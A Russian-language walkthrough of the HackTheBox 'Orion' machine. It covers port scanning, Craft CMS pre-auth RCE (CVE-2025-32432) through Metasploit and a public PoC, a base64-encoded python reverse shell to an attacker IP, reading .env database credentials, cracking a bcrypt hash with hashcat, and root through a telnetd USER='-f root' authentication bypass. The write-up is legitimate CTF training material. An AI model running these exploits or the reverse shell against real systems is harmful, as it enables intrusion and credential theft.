# HackTheBox---Orion Writeup

## Краткая сводка (Summary)

  * **Целевая ОС:** Linux (Ubuntu 22.04.5 LTS)
  * **Вектор входа:** Craft CMS 5.6.16 в режиме разработки -> Отравление PHP-сессии через анонимный эндпоинт `assets/generate-transform` -> Десериализация через Yii gadget chain (CVE-2025-32432) -> Удалённое выполнение кода без аутентификации.
  * **Закрепление (Проверенная уязвимость):** Публичный PoC P34NUT2 для CVE-2025-32432 -> Webshell без обратного соединения -> Интерактивный обратный шелл под `www-data` через `python3`, `pty` и `nohup setsid`.
  * **Боковое перемещение (Lateral Movement):** Чтение `.env` Craft CMS -> Учётные данные MySQL root -> Таблица `users` -> bcrypt-хэш администратора -> Взлом через `hashcat -m 3200` -> Пароль `darkangel`.
  * **Повышение привилегий (Privilege Escalation):** Локальный сервис Telnet на `127.0.0.1:23` (GNU Inetutils 2.7) -> Эксплуатация CVE-2026-24061 (Authentication Bypass через переменную окружения `USER`) -> Получение root без пароля.

## Разведка

### Сканирование портов

Начинаю со сканирования всех TCP-портов с указанием версий обнаруженных сервисов:

    nmap -sC -sV -p- [IP Orion]

### Результат

    PORT   STATE    SERVICE  VERSION
    22/tcp open     ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
    53/tcp filtered domain
    80/tcp open     http     nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://orion.htb/

### Анализ

Открыты только SSH (22) и HTTP (80). Nginx редиректит на `orion.htb`, поэтому добавляем домен в `/etc/hosts`:

    echo "[IP Orion]  orion.htb" | sudo tee -a /etc/hosts

Решение по шагам:

  1. How many open TCP ports are listening on Orion?

Ответ: 2

## Веб-разведка (Web Enumeration)

### Определение CMS и версии

Переходим на `http://orion.htb/`. В `/admin` находим форму логина с указанием версии:

**Craft CMS 5.6.16**

Проверяем `/robots.txt`, сервер возвращает debug-страницу (500 Internal Server Error) с полным трейсом Yii, что подтверждает режим разработки (`devMode`):

    yii\base\Application::handleRequest()
    in /var/www/html/craft/vendor/yiisoft/yii2/base/Application.php

Решение по шагам:

  2. What is the version of CraftCMS running on the target?

Ответ: 5.6.16


### Поиск уязвимости

Craft CMS 5.6.16 уязвим к **CVE-2025-32432**, удалённое выполнение кода без аутентификации через эндпоинт `assets/generate-transform`:

  * Экшен помечен как `allowAnonymous`, доступен без аутентификации.
  * Записывает сырые query-параметры в PHP-сессию (`/var/lib/php/sessions`).
  * Через Yii gadget chain (PhpManager) возможна десериализация, что приводит к выполнению кода.

Ручная проверка:

    curl -i -X POST http://orion.htb/index.php?p=actions/assets/generate-transform -d "assetId=1"

Ответ `400 Bad Request` с `BadRequestHttpException: Unable to verify your data submission` (CSRF). Экшен существует, анонимный, требует CSRF-токен и валидный `assetId`.

## Получение первоначального доступа (Initial Access)

### Metasploit, подтверждение уязвимости

    msfconsole
    use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
    set RHOSTS [IP Orion]
    set VHOST orion.htb
    set ASSET_ID 1
    set LHOST [IP атакующей машины]
    set LPORT 4444
    set payload php/meterpreter/reverse_tcp
    run

Результат:

    [+] Leaked session.save_path: /var/lib/php/sessions
    [+] The target is vulnerable. Session path leaked
    [*] Injecting stub & triggering payload...
    [*] Meterpreter session 2 closed. Reason: Died

Уязвимость подтверждена, но Meterpreter и `php/reverse_php` отваливаются, PHP-FPM убивает дочерние процессы после завершения HTTP-запроса.

### Webshell без обратного соединения, PoC P34NUT2

Используем публичный PoC для CVE-2025-32432. Он реализует webshell без обратного соединения, где каждая команда — отдельный HTTP-запрос, а вывод возвращается прямо в ответе.

    git clone https://github.com/P34NUT2/CVE-2025-32432-exploit-by-P34NUT.git
    cd CVE-2025-32432-exploit-by-P34NUT
    python3 -m venv venv && source venv/bin/activate

Проверка RCE:

    python3 craftcms_rce_exploit_php.py -u http://orion.htb -c "id"

Результат:

    [+] Vulnerable target
    [+] Found session path: /var/lib/php/sessions
    [+] Session poisoning request sent successfully
    [+] Step4 Trigger RCE
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Обратный шелл через python3 и nohup setsid

`nohup setsid` отвязывает процесс от PHP-FPM, чтобы обратный шелл не умирал после завершения запроса.

Генерация base64:

    echo -n 'nohup setsid python3 -c "import socket,subprocess,os,pty;s=socket.socket();s.connect((\"10.10.14.126\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"' | base64 -w 0

Запуск:

    # Терминал 1
    nc -lvnp 4444

    # Терминал 2
    python3 craftcms_rce_exploit_php.py -u http://orion.htb -a 1 \
      -c "echo <B64> | base64 -d | bash"

Результат:

    connect to [IP атакующей машины] from (UNKNOWN) [IP Orion] 47338
    www-data@orion:~/html/craft/web$

3. Which user is running CraftCMS?

Ответ: www-data

## Боковое перемещение (Lateral Movement)

### Чтение .env Craft CMS

    cat /var/www/html/craft/.env

Содержимое:

    CRAFT_ENVIRONMENT=dev
    CRAFT_DEV_MODE=true
    CRAFT_ALLOW_ADMIN_CHANGES=true
    CRAFT_DB_DRIVER=mysql
    CRAFT_DB_SERVER=127.0.0.1
    CRAFT_DB_DATABASE=orion
    CRAFT_DB_USER=root
    CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

Решение по шагам:

  4. Which file contains the password for the MySQL database?

Ответ: .env

### Подключение к MySQL и взлом bcrypt

    mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion

    MariaDB [orion]> SELECT username, password, email FROM users;
    +----------+--------------------------------------------------------------+----------------+
    | username | password                                                     | email          |
    +----------+--------------------------------------------------------------+----------------+
    | admin    | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | adam@orion.htb |
    +----------+--------------------------------------------------------------+----------------+

Взлом через hashcat:

    echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
    hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

Результат:

    $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel

Решение по шагам:

  5. What is the password that can be obtained from the MySQL database?

Ответ: darkangel

Пароль `darkangel` переиспользуется и подходит для Linux-пользователя `adam` (SSH).

## Повышение привилегий (Privilege Escalation)

### Поиск локальных сервисов

    ss -tlnp

Результат:

    State  Recv-Q Send-Q Local Address:Port   Peer Address:Port  Process
    LISTEN 0      80         127.0.0.1:3306   0.0.0.0:*          mysql
    LISTEN 0      511          0.0.0.0:80     0.0.0.0:*          nginx
    LISTEN 0      10         127.0.0.1:23     0.0.0.0:*          telnetd
    LISTEN 0      128          0.0.0.0:22     0.0.0.0:*          sshd

Решение по шагам:

  6. Which service, unrelated to CraftCMS, is open only locally on Orion?

Ответ: telnet

### Определение версии

    telnetd --version

Результат:

    telnetd (GNU inetutils) 2.7

Решение по шагам:

  7. What is the version of the service found?

Ответ: 2.7

### Эксплуатация CVE-2026-24061

Механика:

  * `telnetd` принимает переменные окружения от клиента через опцию `NEW-ENVIRON`.
  * Значение `USER` не санитизируется и передаётся в `login`.
  * `USER="-f root"` превращается в `login -f root`, что пропускает аутентификацию (флаг `-f` = force).

Команда:

    USER="-f root" telnet -a 127.0.0.1

Результат:

    Welcome to Ubuntu 22.04.5 LTS ...

    root@orion:~# whoami
    root

### Чтение флагов

    root@orion:~# cat /home/adam/user.txt
    root@orion:~# cat /root/root.txt

## Итоговая таблица

| Этап | Находка | Инструмент |
|---|---|---|
| Разведка | 22, 80, orion.htb | nmap |
| Веб | Craft CMS 5.6.16, режим разработки | curl, браузер |
| Первоначальный доступ | CVE-2025-32432, RCE без аутентификации | PoC P34NUT2 |
| Шелл | www-data через python, pty и nohup | обратный шелл |
| Боковое перемещение | .env, учётные данные root от MySQL | cat |
| Пароль | bcrypt, darkangel | hashcat -m 3200 |
| Повышение привилегий | CVE-2026-24061, обход аутентификации Telnet | USER="-f root" telnet -a |
| Root | root.txt, user.txt | cat |


## Ссылки

  * [CVE-2025-32432, NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
  * [CVE-2025-32432, SensePost](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/)
  * [PoC P34NUT2](https://github.com/P34NUT2/CVE-2025-32432-exploit-by-P34NUT)
  * [CVE-2026-24061, NVD](https://nvd.nist.gov/vuln/detail/cve-2026-24061/)
